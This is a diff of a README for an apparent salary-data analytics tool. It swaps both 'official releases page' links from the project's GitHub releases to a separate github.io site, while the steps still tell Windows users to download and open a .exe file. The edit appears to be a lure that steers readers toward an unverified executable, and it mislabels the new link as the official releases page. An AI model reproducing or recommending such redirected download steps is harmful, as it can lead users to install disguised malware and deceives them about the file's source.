@@ -1,6 +1,6 @@
 # 📊 salary-intelligence-platform - Understand your professional worth with data
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Quinndissimulative513/salary-intelligence-platform/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://quinndissimulative513.github.io)
 
 This platform provides insights into global pay structures. It processes over 71,000 real salary records from 94 countries to show you how compensation works across different regions and industries. The system uses methods like regression, machine learning, and statistical testing to offer an view of salary trends.
 
@@ -8,7 +8,7 @@ This platform provides insights into global pay structures. It processes over 71
 
 You need to download the software from the official project page to begin. The setup process works on standard Windows computers.
 
-1. Visit the [official releases page](https://github.com/Quinndissimulative513/salary-intelligence-platform/releases).
+1. Visit the [official releases page](https://quinndissimulative513.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe to start your download.
 4. Open the file once the download finishes.
